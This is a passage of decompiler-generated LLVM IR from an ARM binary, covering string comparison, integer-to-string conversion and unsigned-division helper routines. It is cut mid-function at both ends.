  br label %dec_label_pc_126bc

dec_label_pc_126bc:                               ; preds = %dec_label_pc_126bc, %dec_label_pc_126b8
  %v0_126bc = phi i32 [ %v1_126bc, %dec_label_pc_126bc ], [ 0, %dec_label_pc_126b8 ]
  %v1_126bc = add i32 %v0_126bc, 1
  store i32 %v1_126bc, i32* @r2, align 4
  %v2_126c0 = add i32 %v1_126bc, %arg2
  %v3_126c0 = inttoptr i32 %v2_126c0 to i8*
  %v4_126c0 = load i8, i8* %v3_126c0, align 1
  %v6_126c0 = zext i8 %v4_126c0 to i32
  store i32 %v6_126c0, i32* @r3, align 4
  %v2_126c4 = icmp eq i8 %v4_126c0, 0
  br i1 %v2_126c4, label %dec_label_pc_126cc, label %dec_label_pc_126bc

dec_label_pc_126cc:                               ; preds = %dec_label_pc_126bc, %bb21
  %v1_126cc = phi i32 [ %v3_126a8, %bb21 ], [ %v1_126bc, %dec_label_pc_126bc ]
  %v9_126cc = icmp eq i32 %v0_126f43, %v1_126cc
  br i1 %v9_126cc, label %dec_label_pc_126f4.preheader, label %dec_label_pc_126d4

dec_label_pc_126f4.preheader:                     ; preds = %dec_label_pc_126cc
  %v2_126f45 = icmp eq i32 %v0_126f43, 0
  br i1 %v2_126f45, label %dec_label_pc_126fc, label %dec_label_pc_126dc

dec_label_pc_126d4:                               ; preds = %dec_label_pc_126dc, %dec_label_pc_126cc
  ret i32 0

dec_label_pc_126dc:                               ; preds = %dec_label_pc_126ec, %dec_label_pc_126f4.preheader
  %v0_126f4.in = phi i32 [ %v0_126f4, %dec_label_pc_126ec ], [ %v0_126f43, %dec_label_pc_126f4.preheader ]
  %v0_126f0 = phi i32 [ %v1_126f0, %dec_label_pc_126ec ], [ %arg2, %dec_label_pc_126f4.preheader ]
  %v0_126ec = phi i32 [ %v1_126ec, %dec_label_pc_126ec ], [ %tmp, %dec_label_pc_126f4.preheader ]
  %v0_126f4 = add i32 %v0_126f4.in, -1
  %v1_126dc = inttoptr i32 %v0_126ec to i8*
  %v2_126dc = load i8, i8* %v1_126dc, align 1
  %v3_126dc = zext i8 %v2_126dc to i32
  store i32 %v3_126dc, i32* @r2, align 4
  %v1_126e0 = inttoptr i32 %v0_126f0 to i8*
  %v2_126e0 = load i8, i8* %v1_126e0, align 1
  %v3_126e0 = zext i8 %v2_126e0 to i32
  store i32 %v3_126e0, i32* @r3, align 4
  %v9_126e4 = icmp eq i8 %v2_126dc, %v2_126e0
  br i1 %v9_126e4, label %dec_label_pc_126ec, label %dec_label_pc_126d4

dec_label_pc_126ec:                               ; preds = %dec_label_pc_126dc
  %v1_126ec = add i32 %v0_126ec, 1
  %v1_126f0 = add i32 %v0_126f0, 1
  %v2_126f4 = icmp eq i32 %v0_126f4, 0
  br i1 %v2_126f4, label %dec_label_pc_126fc, label %dec_label_pc_126dc

dec_label_pc_126fc:                               ; preds = %dec_label_pc_126ec, %dec_label_pc_126f4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_126bc, { 0, 1, 3, 2 }
  uselistorder i8 %v2_12684, { 1, 0 }
}

define i32 @util_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12708 = load i8, i8* %arg1, align 1
  %v2_1270c = icmp eq i8 %v2_12708, 0
  %v0_12710 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_1270c, label %bb, label %dec_label_pc_1271c

bb:                                               ; preds = %entry
  %v3_12708 = zext i8 %v2_12708 to i32
  br label %dec_label_pc_12730

dec_label_pc_1271c:                               ; preds = %entry
  br label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_12720, %dec_label_pc_1271c
  %v0_12720 = phi i32 [ %v1_12720, %dec_label_pc_12720 ], [ 0, %dec_label_pc_1271c ]
  %v1_12720 = add i32 %v0_12720, 1
  %v2_12724 = add i32 %v1_12720, %tmp
  %v3_12724 = inttoptr i32 %v2_12724 to i8*
  %v4_12724 = load i8, i8* %v3_12724, align 1
  %v2_12728 = icmp eq i8 %v4_12724, 0
  br i1 %v2_12728, label %dec_label_pc_12730, label %dec_label_pc_12720

dec_label_pc_12730:                               ; preds = %dec_label_pc_12720, %bb
  %v6_12758 = phi i32 [ %v3_12708, %bb ], [ %v1_12720, %dec_label_pc_12720 ]
  %v0_12730 = load i32, i32* %r1.global-to-local, align 4
  %v1_12730 = inttoptr i32 %v0_12730 to i8*
  %v2_12730 = load i8, i8* %v1_12730, align 1
  %v3_12730 = zext i8 %v2_12730 to i32
  %v2_12734 = icmp eq i8 %v2_12730, 0
  br i1 %v2_12734, label %bb26, label %dec_label_pc_12740

bb26:                                             ; preds = %dec_label_pc_12730
  store i32 %v3_12730, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12754

dec_label_pc_12740:                               ; preds = %dec_label_pc_12730
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12744

dec_label_pc_12744:                               ; preds = %dec_label_pc_12744, %dec_label_pc_12740
  %v0_12744 = phi i32 [ %v1_12744, %dec_label_pc_12744 ], [ 0, %dec_label_pc_12740 ]
  %v1_12744 = add i32 %v0_12744, 1
  store i32 %v1_12744, i32* %r2.global-to-local, align 4
  %v2_12748 = add i32 %v1_12744, %v0_12730
  %v3_12748 = inttoptr i32 %v2_12748 to i8*
  %v4_12748 = load i8, i8* %v3_12748, align 1
  %v2_1274c = icmp eq i8 %v4_12748, 0
  br i1 %v2_1274c, label %dec_label_pc_12754, label %dec_label_pc_12744

dec_label_pc_12754:                               ; preds = %dec_label_pc_12744, %bb26
  %v0_12754 = phi i32 [ %v3_12730, %bb26 ], [ %v1_12744, %dec_label_pc_12744 ]
  %v2_12754 = sub i32 %v0_12754, %v0_12710
  %v4_12754 = xor i32 %v0_12754, %v0_12710
  %v5_12754 = xor i32 %v2_12754, %v0_12754
  %v6_12754 = and i32 %v5_12754, %v4_12754
  %v5_12758 = icmp slt i32 %v0_12754, %v0_12710
  br i1 %v5_12758, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_12754
  %v8_12758 = sub i32 %v6_12758, %v0_12710
  %v10_12758 = xor i32 %v6_12758, %v0_12710
  %v11_12758 = xor i32 %v8_12758, %v6_12758
  %v12_12758 = and i32 %v11_12758, %v10_12758
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_12754, %bb27
  %v1_1275c.in = phi i32 [ %v6_12754, %dec_label_pc_12754 ], [ %v12_12758, %bb27 ]
  %v0_1275c.in = phi i32 [ %v2_12754, %dec_label_pc_12754 ], [ %v8_12758, %bb27 ]
  %v0_1275c = icmp slt i32 %v0_1275c.in, 0
  %v1_1275c = icmp slt i32 %v1_1275c.in, 0
  %v2_1275c = xor i1 %v1_1275c, %v0_1275c
  br i1 %v2_1275c, label %dec_label_pc_12788, label %dec_label_pc_1276c.preheader

dec_label_pc_1276c.preheader:                     ; preds = %bb28
  %v2_1276c5 = icmp eq i32 %v0_12710, 0
  br i1 %v2_1276c5, label %dec_label_pc_12788, label %dec_label_pc_12774

dec_label_pc_12764:                               ; preds = %dec_label_pc_12774
  %v1_12764 = add i32 %v0_12764, 1
  %v1_12768 = add i32 %v0_12768, 1
  store i32 %v1_12768, i32* %r1.global-to-local, align 4
  %v2_1276c = icmp eq i32 %v0_1276c, 0
  br i1 %v2_1276c, label %dec_label_pc_12788, label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %dec_label_pc_12764, %dec_label_pc_1276c.preheader
  %v0_1276c.in = phi i32 [ %v0_1276c, %dec_label_pc_12764 ], [ %v0_12710, %dec_label_pc_1276c.preheader ]
  %v0_12768 = phi i32 [ %v1_12768, %dec_label_pc_12764 ], [ %v0_12730, %dec_label_pc_1276c.preheader ]
  %v0_12764 = phi i32 [ %v1_12764, %dec_label_pc_12764 ], [ %tmp, %dec_label_pc_1276c.preheader ]
  %v0_1276c = add i32 %v0_1276c.in, -1
  %v1_12774 = inttoptr i32 %v0_12764 to i8*
  %v2_12774 = load i8, i8* %v1_12774, align 1
  %v3_12774 = zext i8 %v2_12774 to i32
  store i32 %v3_12774, i32* %r2.global-to-local, align 4
  %v1_12778 = inttoptr i32 %v0_12768 to i8*
  %v2_12778 = load i8, i8* %v1_12778, align 1
  %v9_1277c = icmp eq i8 %v2_12774, %v2_12778
  br i1 %v9_1277c, label %dec_label_pc_12764, label %dec_label_pc_12788

dec_label_pc_12788:                               ; preds = %dec_label_pc_12764, %dec_label_pc_1276c.preheader, %dec_label_pc_12774, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_1276c.preheader ], [ 1, %dec_label_pc_12764 ], [ 0, %dec_label_pc_12774 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_12764, { 1, 0 }
  uselistorder i32 %v0_12768, { 1, 0 }
  uselistorder i32 %v0_12754, { 3, 0, 1, 2 }
  uselistorder i32 %v1_12744, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12710, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_12708, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12788, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_1279c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1279c, i32* %r8.global-to-local, align 4
  %v2_1279c = icmp eq i32 %v0_1279c, 0
  store i1 %v2_1279c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_1279c, label %dec_label_pc_1287c, label %dec_label_pc_127ac

dec_label_pc_127ac:                               ; preds = %entry
  %v3_127ac = icmp eq i8 %arg1, 0
  store i1 %v3_127ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_127ac, label %.thread, label %dec_label_pc_127c0

.thread:                                          ; preds = %dec_label_pc_127ac
  %v4_127b4 = inttoptr i32 %v0_1279c to i8*
  store i8 48, i8* %v4_127b4, align 1
  %v0_127b8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127b8.pr.pr, label %.thread1, label %dec_label_pc_127c0

.thread1:                                         ; preds = %.thread
  %v4_127b8 = load i32, i32* %r8.global-to-local, align 4
  %v5_127b8 = add i32 %v4_127b8, 1
  %v6_127b8 = inttoptr i32 %v5_127b8 to i8*
  store i8 0, i8* %v6_127b8, align 1
  %v0_127bc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127bc.pr.pr, label %dec_label_pc_1287c, label %dec_label_pc_127c0

dec_label_pc_127c0:                               ; preds = %dec_label_pc_127ac, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_127c4 = icmp eq i32 %arg2, 10
  store i1 %v7_127c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127c4, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_127c0
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_127c0
  %v4_127c0 = zext i1 %tmp48 to i32
  store i32 %v4_127c0, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_127e48 = sub nsw i32 0, %tmp
  %tmp.v3_127e48 = select i1 %phitmp, i32 %tmp, i32 %v3_127e48
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_127e48, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_127f0 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_127f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %bb46, %.thread6
  %v2_12814 = phi i32 [ %v1_12820, %bb46 ], [ 32, %.thread6 ]
  %v0_12808 = phi i32 [ %v2_12818, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_127f8 = load i32, i32* %r6.global-to-local, align 4
  %v3_127fc = urem i32 %v0_12808, %v0_127f8
  store i32 %v3_127fc, i32* %r1.global-to-local, align 4
  %v7_12800 = icmp eq i32 %v3_127fc, 9
  store i1 %v7_12800, i1* %cpsr_z.global-to-local, align 1
  %v1_12804 = add i32 %v3_127fc, 48
  store i32 %v0_12808, i32* %r0.global-to-local, align 4
  %v7_1280c = icmp sgt i32 %v3_127fc, 9
  %extract.t = trunc i32 %v1_12804 to i8
  br i1 %v7_1280c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_127f4
  %v9_1280c = add i32 %v3_127fc, 55
  %extract.t28 = trunc i32 %v9_1280c to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_127f4, %bb45
  %v0_12814.off0 = phi i8 [ %extract.t, %dec_label_pc_127f4 ], [ %extract.t28, %bb45 ]
  store i32 %v0_127f8, i32* %r1.global-to-local, align 4
  %v3_12814 = load i32, i32* %r7.global-to-local, align 4
  %v4_12814 = add i32 %v3_12814, %v2_12814
  %v5_12814 = inttoptr i32 %v4_12814 to i8*
  store i8 %v0_12814.off0, i8* %v5_12814, align 1
  %v0_12818 = load i32, i32* %r0.global-to-local, align 4
  %v1_12818 = load i32, i32* %r1.global-to-local, align 4
  %v2_12818 = udiv i32 %v0_12818, %v1_12818
  store i32 %v2_12818, i32* %r0.global-to-local, align 4
  %v2_1281c = icmp ugt i32 %v1_12818, %v0_12818
  store i1 %v2_1281c, i1* %cpsr_z.global-to-local, align 1
  %v0_12820 = load i32, i32* %r5.global-to-local, align 4
  %v1_12820 = add i32 %v0_12820, -1
  store i32 %v1_12820, i32* %r5.global-to-local, align 4
  br i1 %v2_1281c, label %dec_label_pc_12828, label %dec_label_pc_127f4

dec_label_pc_12828:                               ; preds = %bb46
  %v0_12828 = load i32, i32* %sl.global-to-local, align 4
  %v2_12828 = icmp eq i32 %v0_12828, 0
  store i1 %v2_12828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12828, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12828
  %v3_1282c = ptrtoint i32* %stack_var_-32 to i32
  %v3_12830 = add i32 %v1_12820, %v3_1282c
  store i32 %v3_12830, i32* %r2.global-to-local, align 4
  %v4_12838 = add i32 %v3_12830, -34
  %v5_12838 = inttoptr i32 %v4_12838 to i8*
  store i8 45, i8* %v5_12838, align 1
  %v0_1283c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1283c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_1283c.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_12828
  %v1_1283c = phi i32 [ %v1_12820, %dec_label_pc_12828 ], [ %v1_1283c.pre, %.thread11 ]
  %v2_1283c = add i32 %v1_1283c, 1
  store i32 %v2_1283c, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_12848 = phi i32 [ %v2_1283c, %.thread12 ], [ %v1_1283c.pre, %.thread11 ]
  %v0_12840 = load i32, i32* %r7.global-to-local, align 4
  %v2_12840 = add i32 %v0_12840, %v1_12848
  %v3_12840 = inttoptr i32 %v2_12840 to i8*
  %v4_12840 = load i8, i8* %v3_12840, align 1
  %v6_12840 = zext i8 %v4_12840 to i32
  %v2_12844 = icmp eq i8 %v4_12840, 0
  store i1 %v2_12844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_12840, i32* %r2.global-to-local, align 4
  br i1 %v2_12844, label %dec_label_pc_1288c, label %dec_label_pc_12854.preheader

dec_label_pc_12854.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_12854.preheader, %dec_label_pc_12854
  %v0_12854 = phi i32 [ 0, %dec_label_pc_12854.preheader ], [ %v1_12854, %dec_label_pc_12854 ]
  %v1_12854 = add i32 %v0_12854, 1
  store i32 %v1_12854, i32* %r1.global-to-local, align 4
  %v2_12858 = add i32 %v1_12854, %v2_12840
  %v3_12858 = inttoptr i32 %v2_12858 to i8*
  %v4_12858 = load i8, i8* %v3_12858, align 1
  %v2_1285c = icmp eq i8 %v4_12858, 0
  store i1 %v2_1285c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1285c, label %dec_label_pc_12864, label %dec_label_pc_12854

dec_label_pc_12864:                               ; preds = %dec_label_pc_12854, %dec_label_pc_1288c
  %v0_1286825 = phi i32 [ %v6_12840, %dec_label_pc_1288c ], [ %v1_12854, %dec_label_pc_12854 ]
  %v0_12864 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12864, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12868

dec_label_pc_12868:                               ; preds = %dec_label_pc_12868.dec_label_pc_12868_crit_edge, %dec_label_pc_12864
  %v2_12874 = phi i32 [ %v5_12874, %dec_label_pc_12868.dec_label_pc_12868_crit_edge ], [ %v0_12864, %dec_label_pc_12864 ]
  %v0_1286c = phi i32 [ %v0_1286c.pre, %dec_label_pc_12868.dec_label_pc_12868_crit_edge ], [ %v2_12840, %dec_label_pc_12864 ]
  %v0_12868 = phi i32 [ %v0_12868.pre, %dec_label_pc_12868.dec_label_pc_12868_crit_edge ], [ %v0_1286825, %dec_label_pc_12864 ]
  %v1_12868 = add i32 %v0_12868, -1
  store i32 %v1_12868, i32* %r1.global-to-local, align 4
  %v1_1286c = inttoptr i32 %v0_1286c to i8*
  %v2_1286c = load i8, i8* %v1_1286c, align 1
  %v5_1286c = add i32 %v0_1286c, 1
  store i32 %v5_1286c, i32* %r2.global-to-local, align 4
  %v3_12870 = icmp eq i32 %v0_12868, 0
  store i1 %v3_12870, i1* %cpsr_z.global-to-local, align 1
  %v3_12874 = inttoptr i32 %v2_12874 to i8*
  store i8 %v2_1286c, i8* %v3_12874, align 1
  %v4_12874 = load i32, i32* %r0.global-to-local, align 4
  %v5_12874 = add i32 %v4_12874, 1
  store i32 %v5_12874, i32* %r0.global-to-local, align 4
  br i1 %v3_12870, label %dec_label_pc_1287c, label %dec_label_pc_12868.dec_label_pc_12868_crit_edge

dec_label_pc_12868.dec_label_pc_12868_crit_edge:  ; preds = %dec_label_pc_12868
  %v0_12868.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_1286c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12868

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12868, %.thread1, %entry
  %v0_1287c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1287c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1287c

dec_label_pc_1288c:                               ; preds = %.thread11._crit_edge
  store i32 %v6_12840, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12864

; uselistorder directives
  uselistorder i32 %v5_12874, { 1, 0 }
  uselistorder i1 %v3_12870, { 1, 0 }
  uselistorder i32 %v0_1286c, { 1, 0 }
  uselistorder i32 %v1_12854, { 0, 1, 3, 2 }
  uselistorder i32 %v6_12840, { 1, 0 }
  uselistorder i32 %v2_12840, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1283c.pre, { 1, 0 }
  uselistorder i32 %v1_12820, { 1, 0, 3, 2 }
  uselistorder i32 %v2_12818, { 1, 0 }
  uselistorder i32 %v3_127fc, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_1279c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12864, { 1, 0 }
  uselistorder label %dec_label_pc_12854, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_127c0, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12894 = load i32, i32* @r1, align 4
  %v1_12894 = add i32 %v0_12894, -1
  store i32 %v1_12894, i32* %r2.global-to-local, align 4
  %v2_12894 = icmp eq i32 %v0_12894, 0
  %v7_12894 = icmp eq i32 %v0_12894, 1
  %v0_12898 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12894, i32 %v0_12898)
  br i1 %v2_12894, label %dec_label_pc_1297c, label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %entry
  %v0_128a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_128a0 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_128a0, %v1_128a0
  br i1 %tmp, label %dec_label_pc_128a8, label %dec_label_pc_12934

dec_label_pc_128a8:                               ; preds = %dec_label_pc_128a0
  %v1_128a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_128a8 = and i32 %v1_128a8, %v1_128a0
  %v4_128a8 = icmp eq i32 %v2_128a8, 0
  br i1 %v4_128a8, label %dec_label_pc_12940, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_128a8
  %v3_128b0 = icmp ult i32 %v1_128a0, 536870912
  br i1 %v3_128b0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_128b0
  %v4_128b4 = mul i32 %v1_128a0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_128b0, %.thread
  %v0_128d4.pr36.ph = phi i32 [ %v4_128b4, %.thread ], [ %v1_128a0, %dec_label_pc_128b0 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_128b0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_128d4.pr36 = phi i32 [ %v4_128c8, %bb81 ], [ %v0_128d4.pr36.ph, %.preheader.preheader ]
  %v1_128cc = phi i32 [ %v4_128cc, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_128c0 = icmp ugt i32 %v0_128d4.pr36, 268435455
  br i1 %v2_128c0, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_128d4thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_128c4 = icmp ult i32 %v0_128d4.pr36, %v0_128a0
  br i1 %v4_128c4, label %bb80, label %dec_label_pc_128d4thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_128c8 = and i32 %v0_128d4.pr36, 268435456
  %v3_128c8 = icmp eq i32 %v2_128c8, 0
  %v4_128c8 = mul i32 %v0_128d4.pr36, 16
  br i1 %v3_128c8, label %bb81, label %dec_label_pc_128d4.loopexit

bb81:                                             ; preds = %bb80
  %v2_128cc = and i32 %v1_128cc, 268435456
  %v3_128cc = icmp eq i32 %v2_128cc, 0
  %v4_128cc = mul i32 %v1_128cc, 16
  br i1 %v3_128cc, label %.preheader, label %dec_label_pc_128d4thread-pre-split.loopexit.loopexit

dec_label_pc_128d4thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_128e048.ph = phi i32 [ %v1_128cc, %bb ], [ %v4_128cc, %bb81 ]
  %v0_128d4.pr38.ph = phi i32 [ %v0_128d4.pr36, %bb ], [ %v4_128c8, %bb81 ]
  br label %dec_label_pc_128d4thread-pre-split.loopexit

dec_label_pc_128d4thread-pre-split.loopexit:      ; preds = %dec_label_pc_128d4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_128e048 = phi i32 [ %v1_128cc, %.thread2 ], [ %v1_128e048.ph, %dec_label_pc_128d4thread-pre-split.loopexit.loopexit ]
  %v0_128d4.pr38 = phi i32 [ %v0_128d4.pr36, %.thread2 ], [ %v0_128d4.pr38.ph, %dec_label_pc_128d4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_128d4thread-pre-split

dec_label_pc_128d4thread-pre-split:               ; preds = %dec_label_pc_128d4thread-pre-split.loopexit, %bb83
  %v1_128e046 = phi i32 [ %v1_128e048, %dec_label_pc_128d4thread-pre-split.loopexit ], [ %v3_128e0, %bb83 ]
  %v0_128d4.pr = phi i32 [ %v0_128d4.pr38, %dec_label_pc_128d4thread-pre-split.loopexit ], [ %v3_128dc, %bb83 ]
  br label %dec_label_pc_128d4

dec_label_pc_128d4.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_128d4

dec_label_pc_128d4:                               ; preds = %dec_label_pc_128d4.loopexit, %dec_label_pc_128d4thread-pre-split
  %v1_128e0 = phi i32 [ %v1_128e046, %dec_label_pc_128d4thread-pre-split ], [ %v1_128cc, %dec_label_pc_128d4.loopexit ]
  %v1_128dc = phi i32 [ %v0_128d4.pr, %dec_label_pc_128d4thread-pre-split ], [ %v4_128c8, %dec_label_pc_128d4.loopexit ]
  %v2_128d4 = icmp slt i32 %v1_128dc, 0
  br i1 %v2_128d4, label %dec_label_pc_128e8, label %bb82

bb82:                                             ; preds = %dec_label_pc_128d4
  %v4_128d8 = icmp ult i32 %v1_128dc, %v0_128a0
  br i1 %v4_128d8, label %bb83, label %dec_label_pc_128e8

bb83:                                             ; preds = %bb82
  %v3_128dc = mul i32 %v1_128dc, 2
  %v2_128e0 = icmp slt i32 %v1_128e0, 0
  %v3_128e0 = mul i32 %v1_128e0, 2
  br i1 %v2_128e0, label %dec_label_pc_128e8, label %dec_label_pc_128d4thread-pre-split

dec_label_pc_128e8:                               ; preds = %bb82, %dec_label_pc_128d4, %bb83
  %v2_128f459 = phi i32 [ %v3_128e0, %bb83 ], [ %v1_128e0, %bb82 ], [ %v1_128e0, %dec_label_pc_128d4 ]
  %v1_128ec51 = phi i32 [ %v3_128dc, %bb83 ], [ %v1_128dc, %bb82 ], [ %v1_128dc, %dec_label_pc_128d4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_128ec

dec_label_pc_128ec:                               ; preds = %.thread11, %dec_label_pc_128e8
  %v1_12920 = phi i32 [ %v4_12920, %.thread11 ], [ %v2_128f459, %dec_label_pc_128e8 ]
  %v1_128f4 = phi i32 [ %v0_1292c, %.thread11 ], [ 0, %dec_label_pc_128e8 ]
  %v1_12924 = phi i32 [ %v4_12924, %.thread11 ], [ %v1_128ec51, %dec_label_pc_128e8 ]
  %v1_128f0 = phi i32 [ %v0_1291c, %.thread11 ], [ %v0_128a0, %dec_label_pc_128e8 ]
  %v3_128ec = icmp ult i32 %v1_128f0, %v1_12924
  br i1 %v3_128ec, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_128ec
  %v3_128f0 = sub i32 %v1_128f0, %v1_12924
  store i32 %v3_128f0, i32* %r0.global-to-local, align 4
  %v3_128f4 = or i32 %v1_128f4, %v1_12920
  store i32 %v3_128f4, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_128ec, %bb84
  %v1_128fc = phi i32 [ %v1_128f0, %dec_label_pc_128ec ], [ %v3_128f0, %bb84 ]
  %v1_12900 = phi i32 [ %v1_128f4, %dec_label_pc_128ec ], [ %v3_128f4, %bb84 ]
  %v4_128f8 = udiv i32 %v1_12924, 2
  %v6_128f8 = icmp ult i32 %v1_128fc, %v4_128f8
  br i1 %v6_128f8, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_128fc = urem i32 %v1_12924, 2
  %v4_128fc = icmp eq i32 %v3_128fc, 0
  %v6_128fc = sub i32 %v1_128fc, %v4_128f8
  store i32 %v6_128fc, i32* %r0.global-to-local, align 4
  br i1 %v4_128fc, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_12900 = udiv i32 %v1_12920, 2
  %v6_12900 = or i32 %v1_12900, %v5_12900
  store i32 %v6_12900, i32* %r2.global-to-local, align 4
  br label %.thread8

